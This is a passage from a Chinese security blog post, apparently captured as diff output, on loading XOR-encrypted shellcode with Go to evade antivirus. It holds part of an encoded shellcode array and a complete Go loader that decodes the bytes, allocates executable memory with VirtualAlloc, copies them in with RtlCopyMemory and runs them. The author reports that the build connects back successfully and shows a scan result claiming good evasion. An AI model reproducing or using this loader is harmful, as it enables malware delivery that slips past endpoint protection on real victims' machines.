class="number">0x4c</span>, <span class="number">0xa4</span>, <span class="number">0x0</span>, <span class="number">0xad</span>, <span class="number">0x2d</span>, <span class="number">0x31</span>, <span class="number">0xfe</span>, <span class="number">0x35</span>, <span class="number">0x51</span>, <span class="number">0x3c</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x13</span>, <span class="number">0x34</span>, <span class="number">0xfe</span>, <span class="number">0x79</span>, <span class="number">0x3d</span>, <span class="number">0x31</span>, <span class="number">0xfe</span>, <span class="number">0x35</span>, <span class="number">0x69</span>, <span class="number">0x3c</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x34</span>, <span class="number">0xfe</span>, <span class="number">0x71</span>, <span class="number">0xfd</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xa5</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x2f</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x2c</span>, <span class="number">0x34</span>, <span class="number">0x2f</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x99</span>, <span class="number">0x55</span>, <span class="number">0x34</span>, <span class="number">0x27</span>, <span class="number">0x8a</span>, <span class="number">0x95</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x2c</span>, <span class="number">0x2f</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>, <span class="number">0x3e</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x28</span>, <span class="number">0x3c</span>, <span class="number">0xcb</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x47</span>, <span class="number">0x2a</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x93</span>, <span class="number">0x3d</span>, <span class="number">0xf4</span>, <span class="number">0x99</span>, <span class="number">0xd5</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x90</span>, <span class="number">0x3c</span>, <span class="number">0xc9</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0xa7</span>, <span class="number">0xb5</span>, <span class="number">0xdd</span>, <span class="number">0xf8</span>, <span class="number">0xfd</span>, <span class="number">0x34</span>, <span class="number">0x21</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0xfc</span>, <span class="number">0x84</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x39</span>, <span class="number">0x2</span>, <span class="number">0x53</span>, <span class="number">0x72</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x39</span>, <span class="number">0xfc</span>, <span class="number">0x9f</span>, <span class="number">0x1d</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x2c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x5c</span>, <span class="number">0xf5</span>, <span class="number">0x1e</span>, <span class="number">0x75</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x1f</span>, <span class="number">0x7f</span>, <span class="number">0x34</span>, <span class="number">0x2b</span>, <span class="number">0x25</span>, <span class="number">0x25</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xb5</span>, <span class="number">0x3d</span>, <span class="number">0x8a</span>, <span class="number">0xb5</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb7</span>, <span class="number">0x3d</span>, <span class="number">0x8a</span>, <span class="number">0xb5</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb4</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x9f</span>, <span class="number">0x7a</span>, <span class="number">0xaa</span>, <span class="number">0x95</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb2</span>, <span class="number">0x1f</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x39</span>, <span class="number">0xfc</span>, <span class="number">0x97</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0xec</span>, <span class="number">0xd0</span>, <span class="number">0x1</span>, <span class="number">0x14</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0x1</span>, <span class="number">0x7f</span>, <span class="number">0x3c</span>, <span class="number">0x8a</span>, <span class="number">0xbb</span>, <span class="number">0x0</span>, <span class="number">0x90</span>, <span class="number">0x9d</span>, <span class="number">0xe6</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x99</span>, <span class="number">0x65</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x97</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x1f</span>, <span class="number">0x71</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x77</span>, <span class="number">0xac</span>, <span class="number">0xbd</span>, <span class="number">0x2a</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0xf6</span>, <span class="number">0x8d</span>, <span class="number">0x75</span>, <span class="number">0xb</span>, <span class="number">0x20</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0xb1</span>, <span class="number">0x55</span>, <span class="number">0x2b</span>, <span class="number">0xfc</span>, <span class="number">0x83</span>, <span class="number">0x1f</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x2c</span>, <span class="number">0x1d</span>, <span class="number">0x75</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x87</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x2d</span>, <span class="number">0xd1</span>, <span class="number">0x26</span>, <span class="number">0x90</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xb6</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0xb2</span>, <span class="number">0x38</span>, <span class="number">0x44</span>, <span class="number">0xbc</span>, <span class="number">0x3c</span>, <span class="number">0xfc</span>, <span class="number">0x85</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0xaf</span>, <span class="number">0x3d</span>, <span class="number">0xfc</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x77</span>, <span class="number">0xac</span>, <span class="number">0xbd</span>, <span class="number">0x2a</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0xf6</span>, <span class="number">0x8d</span>, <span class="number">0x75</span>, <span class="number">0x8</span>, <span class="number">0x5d</span>, <span class="number">0x2d</span>, <span class="number">0x34</span>, <span class="number">0x22</span>, <span class="number">0x2c</span>, <span class="number">0x1d</span>, <span class="number">0x75</span>, <span class="number">0x35</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x2d</span>, <span class="number">0x1f</span>, <span class="number">0x75</span>, <span class="number">0x2f</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x7e</span>, <span class="number">0x5a</span>, <span class="number">0x7a</span>, <span class="number">0x45</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x22</span>, <span class="number">0x2c</span>, <span class="number">0x34</span>, <span class="number">0xcf</span>, <span class="number">0x0</span>, <span class="number">0x1b</span>, <span class="number">0x38</span>, <span class="number">0x14</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>, <span class="number">0x3c</span>, <span class="number">0x8a</span>, <span class="number">0xbb</span>, <span class="number">0x9c</span>, <span class="number">0x49</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x8a</span>, <span class="number">0x3d</span>, <span class="number">0x74</span>, <span class="number">0xb6</span>, <span class="number">0x3d</span>, <span class="number">0x5c</span>, <span class="number">0xb3</span>, <span class="number">0x3d</span>, <span class="number">0xf0</span>, <span class="number">0x83</span>, <span class="number">0x0</span>, <span class="number">0xc1</span>, <span class="number">0x34</span>, <span class="number">0x8a</span>, <span class="number">0x92</span>, <span class="number">0x2d</span>, <span class="number">0x1f</span>, <span class="number">0x75</span>, <span class="number">0x2c</span>, <span class="number">0x3c</span>, <span class="number">0xb2</span>, <span class="number">0xb7</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0xd7</span>, <span class="number">0x23</span>, <span class="number">0x8a</span>, <span class="number">0xa0</span>}</span><br><span class="line">	<span class="keyword">var</span> shellcode []<span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(xor_shellcode); i++ {</span><br><span class="line">		shellcode = <span class="built_in">append</span>(shellcode, xor_shellcode[i]^KEY_1^KEY_2)</span><br><span class="line">	}</span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> {</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	}</span><br><span class="line">	_, _, err = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">"The operation completed successfully."</span> {</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	}</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>然后<code>go build</code>就可以了，用upx压缩一下体积也不是很大</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220094240-0280b88c-22ca-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>可以正常上线：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220095000-087600b6-22cb-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>查杀一下<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220094615-82b02394-22ca-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><p></p>
+<p><code>virscan</code>的<a href="http://r.virscan.org/language/zh-cn/report/9c50256a567b0fcbec0f9a6ab7bad0ba" target="_blank" rel="noopener">扫描结果</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191220094724-abce80cc-22ca-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>说明golang加载<code>shellcode</code>免杀效果还是不错的，而且体积也没有<code>python</code>的大，后期还是有很大的挖掘空间的</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-12-20T01:58:25.714Z" itemprop="dateUpdated">2019-12-20 09:58:25</time>
+</span><br>
+
+
+        
+        know it then hack it
+        
+    </div>
+    
+    <footer>
+        <a href="https://byqiyou.github.io">
+            <img src="/img/avatar.jpg" alt="">
+            
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/">golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/">pentest</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/&title=《使用golang加载异或的shellcode免杀》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/&title=《使用golang加载异或的shellcode免杀》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《使用golang加载异或的shellcode免杀》 — 七友&url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/12/19/golang指针类型转换上遇到的一些问题/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">golang指针类型转换上遇到的一些问题</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'true';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+<section class="comments" id="comments">
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
+    <!-- UY END -->
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        Thinks
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span> &copy; 2018 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/&title=《使用golang加载异或的shellcode免杀》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/&title=《使用golang加载异或的shellcode免杀》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《使用golang加载异或的shellcode免杀》 — 七友&url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2019/12/20/使用golang加载异或的shellcode免杀/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Leave';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Come back';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
